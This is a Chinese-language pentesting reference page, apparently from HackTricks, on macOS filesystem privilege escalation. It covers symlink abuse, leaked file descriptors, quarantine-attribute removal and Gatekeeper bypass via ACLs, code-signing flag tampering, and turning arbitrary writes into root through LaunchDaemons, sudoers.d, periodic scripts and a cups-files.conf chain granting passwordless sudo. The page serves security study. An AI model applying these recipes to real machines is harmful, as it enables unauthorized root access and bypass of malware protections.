# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

对于一个**目录**，三个权限位的含义与普通文件不同。`chmod(1)` 在应用于目录时，将执行位称为“**search**”<sup>[[2]](#references)</sup>：

> `0100` 对于文件，允许所有者执行。对于目录，允许所有者在目录中进行 **search**。

- **read** - 可以**枚举**目录条目（列出名称）。
- **write** - 可以在目录中**创建、重命名和删除条目**。注意，这是*包含目录*的属性，而不是文件的属性：只要可以写入文件的父目录，即使无法读取或写入某个文件，也可以删除它。
- 要删除一个**子目录**，它必须为空；而这反过来要求拥有足够的权限来删除其中的所有内容。
- 如果目录设置了 **sticky bit**（`S_ISVTX`，例如 `/tmp`），操作会受到限制——POSIX 规定，此时进程只有在拥有该文件、拥有该目录或具备适当权限时，才能删除或重命名其中的文件。<sup>[[1]](#references)</sup>
- **execute / search** - 允许**遍历**目录。路径名解析会在“其前一个组件所指定的目录中”定位每个组件，因此，只要路径前缀中的任一组件失去 search 权限，即使叶文件本身对所有用户可读，其下的所有内容也都无法通过路径访问。<sup>[[1]](#references)</sup>

### Dangerous Combinations

**如何覆盖由 root 拥有的文件/文件夹**，但满足以下任一条件：

- 路径中的一个父**目录所有者**是该用户
- 路径中的一个父**目录所有者**是具有**写入权限**的 **users group**
- 某个 users **group** 对该**文件**具有 **write** 权限

在上述任一组合下，攻击者都可以向预期路径注入 **sym/hard link**，从而获得特权任意写入能力。

### Folder root R+X special case

这直接源于上述路径名解析规则。如果一个**目录仅向 root 授予 R+X**，那么其中的文件对其他所有人来说都无法通过*路径*访问——但**文件自身的权限位可能仍然较为宽松**。真正起阻碍作用的只有该目录。

因此，任何能够让你将文件**移出该目录**的 primitive——例如特权进程将攻击者选择的路径**移动/重命名/复制**到你可以遍历的位置——都会转化为任意读取，而完全不需要绕过文件自身的 mode：
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
查找特权文件移动程序（installers、日志轮转程序、崩溃/诊断收集器、备份和“export”功能），尤其关注那些接受低权限用户提供的源路径的程序。

## Symbolic Link / Hard Link

### 宽松的文件/文件夹

如果特权进程正在向一个**文件**写入数据，而该文件可能由**低权限用户控制**，或可能是由低权限用户**预先创建**的，那么用户只需通过 Symbolic 或 Hard link 将其**指向另一个文件**，特权进程就会向该文件写入数据。

检查其他部分，了解攻击者如何**滥用任意写入来提升权限**。

### Open `O_NOFOLLOW`

根据 [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)：*“如果掩码中使用了 `O_NOFOLLOW`，且传递给 `open()` 的目标文件是 symbolic link，则 `open()` 将失败。”* 但它只检查**最后一个**组件——所有**中间**组件仍会被解析并跟随。因此，开发者即使使用 `O_NOFOLLOW` “保护”了写入操作，攻击者仍然可以通过在目标路径的任意**父目录**中植入 symlink 来发起攻击。<sup>[[3]](#references)</sup>

同一份 man page 记录了能够真正消除这一漏洞的 flags：<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *“如果……传递给 `open()` 的路径中的任何组件是 symbolic link，则 `open()` 将失败。”*
- **`O_RESOLVE_BENEATH`** — *“如果……指定的路径解析结果逃逸出与该 fd 关联的目录，则 `openat()` 将失败。”*

除此之外，相对于已验证的目录 FD 使用 `openat()`，或使用 `realpath()` 后重新验证，是阻止路径中间 symlink 交换的其余方法。

## .fileloc

带有 **`.fileloc`** 扩展名的文件可以指向其他应用程序或二进制文件，因此当它们被打开时，对应的应用程序/二进制文件就会被执行。\
示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 文件描述符

### Leak FD（无 `O_CLOEXEC`）

如果调用 `open` 时没有设置 `O_CLOEXEC` 标志，文件描述符就会被子进程继承。因此，如果一个特权进程打开了一个特权文件，并执行了由攻击者控制的进程，攻击者就会 **继承指向该特权文件的 FD**。

典型示例是 **OS X 10.10 中的 `DYLD_PRINT_TO_FILE` LPE**（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)）：<sup>[[4]](#references)</sup>

- `dyld` 即使在 **受限的（suid root）二进制文件** 中也遵循 `DYLD_PRINT_TO_FILE=/path`，因为该变量是在 `processDyldEnvironmentVariable()` 之外解析的。
- 它执行了 `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`，因此会在任意路径创建一个 **由 root 拥有的文件**。
- 该 FD **从未被关闭，也没有 close-on-exec 标志**，因此 suid 二进制文件的每个子进程都会继承一个 **指向 root 所有文件的可写 FD**。
- 例如，运行 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`，然后在子进程中读取继承的 FD 编号，就可以执行任意 root-owned 写入；`fcntl(fd, F_SETFL, 0)` 甚至可以清除 `O_APPEND`，从而允许覆盖而不是追加。

只要特权进程在 `exec` 你控制的程序之前打开文件，就可能出现同样的情况（helper 工具、通过 `$EDITOR` 调用的 `crontab` 风格编辑器、从环境变量路径打开的日志/调试文件等）。使用以下命令枚举你继承的 FD：
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
任何指向你无法自行打开的文件的、大于 `2` 的内容，都是 arbitrary-write（或 arbitrary-read）primitive。

## 避免 quarantine xattrs tricks

### 移除它
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable 标志

如果文件/文件夹具有此 immutable 属性，则无法为其设置 xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### 不支持 xattr 的文件系统

并非 macOS 能够挂载的每个文件系统都原生存储 **扩展属性**。HFS+ 和 APFS 支持；**FAT32、exFAT 以及（大多数）NFS 挂载不支持**——macOS 会通过写入名为 `._<filename>` 的 **AppleDouble** 侧文件来模拟它们（[The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)）。<sup>[[5]](#references)</sup>

这对 quarantine 很重要，因为 xattr 只有在能够从同一卷中实际写入 **并读回** 时才会保留：
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
如果之后通过忽略 `._` companion 的路径读取该卷（或者 companion 被移除/删除），文件到达时将**不带 quarantine flag**——而一个未 quarantine 的 `.app` 就足以逃逸 App Sandbox，详见 [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)。

### writeextattr ACL

此 ACL 阻止向文件添加 `xattrs`
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 文件格式会复制文件，包括其 ACE。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中可以看到，存储在名为 **`com.apple.acl.text`** 的 xattr 中的 ACL 文本表示形式，将被设置为解压文件的 ACL。因此，如果你使用 **AppleDouble** 文件格式将一个应用程序压缩到 zip 文件中，并为其设置了阻止写入其他 xattr 的 ACL……那么 quarantine xattr 就不会被设置到该应用程序中：

请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。<sup>[[6]](#references)</sup>

要复现此问题，我们首先需要获取正确的 acl 字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（请注意，即使此方法有效，sandbox 也会先写入 quarantine xattr）

并非真正需要，但我还是保留在这里，以防万一：

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## 绕过签名检查

### 绕过 platform binary 检查

一些安全检查会检查二进制文件是否为 **platform binary**，例如，以允许其连接到 XPC service。然而，正如 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ 中所展示的，可以通过获取一个 platform binary（例如 /bin/ls），并通过环境变量 `DYLD_INSERT_LIBRARIES` 使用 dyld 注入 exploit 来绕过此检查。<sup>[[7]](#references)</sup>

### 绕过 `CS_REQUIRE_LV` 和 `CS_FORCED_LV` 标志

正在执行的二进制文件可以修改自身的标志，以通过类似以下代码的方式绕过检查：<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundle 中包含文件 **`_CodeSignature/CodeResources`**，其中包含 **Bundle** 中每个单独 **file** 的 **hash**。请注意，CodeResources 的 hash 也嵌入在 **executable** 中，因此我们也无法篡改它。

不过，有些文件不会被检查 **signature**；这些文件在 plist 中使用 `omit` key 标记，例如：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
可以通过命令行计算资源的签名：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## 挂载 dmgs

用户可以挂载自定义创建的 dmg，甚至将其挂载到某些现有文件夹之上。以下是创建包含自定义内容的自定义 dmg package 的方法：
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常，macOS 会通过 `com.apple.DiskArbitrarion.diskarbitrariond` Mach service 挂载磁盘（由 `/usr/libexec/diskarbitrationd` 提供）。如果将参数 `-d` 添加到 LaunchDaemons plist 文件中并重启，它会将日志存储在 `/var/log/diskarbitrationd.log`。\
不过，也可以使用 `hdik` 和 `hdiutil` 等工具直接与 `com.apple.driver.DiskImages` kext 通信。

## 任意写入

### Periodic sh 脚本

如果你的脚本可以被解释为 **shell script**，则可以覆盖 **`/etc/periodic/daily/999.local`** shell script，该脚本每天都会被触发。

你可以使用以下命令 **模拟**该脚本的执行：**`sudo periodic daily`**

### Daemons

编写一个任意的 **LaunchDaemon**，例如 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，并在 plist 中执行任意脚本，例如：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
只需生成脚本 `/Applications/Scripts/privesc.sh`，其中包含你希望以 root 身份运行的 **commands**。

### Sudoers 文件

如果你拥有 **arbitrary write** 权限，就可以在 **`/etc/sudoers.d/`** 文件夹中创建文件，从而授予自己 **sudo** 权限。

### PATH 文件

文件 **`/etc/paths`** 是填充 PATH 环境变量的主要位置之一。你必须是 root 才能覆盖它；但是，如果 **privileged process** 运行某个未使用完整路径的 **command**，你可能可以通过修改此文件来 **hijack** 它。

你也可以在 **`/etc/paths.d`** 中写入文件，以便将新文件夹加载到 **PATH** 环境变量中。

### cups-files.conf

此 technique 曾用于[这篇 writeup](https://www.kandji.io/blog/macos-audit-story-part1)。<sup>[[8]](#references)</sup>

创建文件 `/etc/cups/cups-files.conf`，内容如下：
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
这将创建文件 `/etc/sudoers.d/lpe`，并将权限设置为 777。末尾的额外垃圾内容用于触发错误日志的创建。

然后，将提升权限所需的配置写入 `/etc/sudoers.d/lpe`，例如 `%staff ALL=(ALL) NOPASSWD:ALL`。

接着，再次修改文件 `/etc/cups/cups-files.conf`，指定 `LogFilePerm 700`，使新的 sudoers 文件在调用 `cupsctl` 时变为有效配置。

### Sandbox Escape

通过 FS arbitrary write 可以逃逸 macOS sandbox。有关示例，请查看页面 [macOS Auto Start](../../../../macos-auto-start-locations.md)。一种常见方法是在 `~/Library/Preferences/com.apple.Terminal.plist` 中写入一个会在启动时执行命令的 Terminal 偏好设置文件，然后使用 `open` 调用它。

## Generate writable files as other users

一种非常常见的 privesc 原语是让一个**特权进程在你控制的目录中为你创建文件**，然后继续保留对该文件的**写入权限**。这需要满足以下两个条件：

1. 你拥有一个目录（或者可以在其中设置**可继承的 ACL**），这样在其中创建的任何内容都会继承你的权限。
2. 一个可以被告知**在哪里**创建文件的特权/`suid` 进程 —— 通常通过 debug/logging 环境变量、配置文件或 helper 的 XPC API 实现。

**可继承的 ACL** 部分使你能够写入由其他用户拥有的已创建文件。`file_inherit` / `directory_inherit` 继承标志记录在 [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) 中：
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
现在，任何 privileged process 在 `$DIRNAME` 内创建的文件都将对 **你可写**。如果该目录同时也是之后会被 **root 执行** 的位置（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon 目录……），这就是一次直接的 root escalation。获得文件后应写入什么内容，请参阅上面的 [Sudoers File](#sudoers-file) 和 [cups-files.conf](#cups-filesconf) 部分。

如需查看“env variable 使 root process 创建文件，而 FD 泄漏给你”这一完整示例链，请参阅上面的 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)。

## POSIX 共享内存

**POSIX 共享内存**允许符合 POSIX 标准的操作系统中的进程访问公共内存区域。与其他进程间通信方法相比，它能够实现更快的通信。该过程包括使用 `shm_open()` 创建或打开共享内存对象，使用 `ftruncate()` 设置其大小，然后使用 `mmap()` 将其映射到进程的地址空间中。之后，进程可以直接从该内存区域读取数据和向其中写入数据。为管理并发访问并防止数据损坏，通常会使用 mutex 或 semaphore 等同步机制。最后，进程使用 `munmap()` 和 `close()` 解除映射并关闭共享内存，并可选择使用 `shm_unlink()` 移除内存对象。在多个进程需要快速访问共享数据的环境中，该系统尤其适合高效、快速的 IPC。

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>消费者代码示例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** 是 macOS 中引入的一项安全功能，用于增强用户应用中 **file descriptor operations** 的安全性和可靠性。这些 guarded descriptors 提供了一种将特定限制或“guards”与 file descriptors 关联的方法，并由 kernel 强制执行。

此功能对于防止某些类别的安全漏洞特别有用，例如 **unauthorized file access** 或 **race conditions**。当某个 thread 正在访问一个 file description，从而**使另一个存在漏洞的 thread 获得对它的访问权限**，或者某个 file descriptor 被**继承**到存在漏洞的 child process 中时，就可能出现这些漏洞。与此功能相关的一些函数包括：

- `guarded_open_np`：使用 guard 打开一个 FD
- `guarded_close_np`：关闭它
- `change_fdguard_np`：更改 descriptor 上的 guard flags（甚至可以移除 guard protection）

## References

- [1] [POSIX.1-2024 — 基础定义，第 4 章（File Access Permissions、Directory Protection、Pathname Resolution）](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html)（directory search/execute bit、ACL inheritance flags）
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html)（`O_NOFOLLOW`、`O_NOFOLLOW_ANY`、`O_RESOLVE_BENEATH`）
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)（未设置 close-on-exec 的 leaked FD）
- [5] [The Eclectic Light Company - 哪些 file systems 和 cloud services 会保留 extended attributes？](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper 的 Achilles heel：揭示一个 macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - macOS Sandbox Escapes 的新时代](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
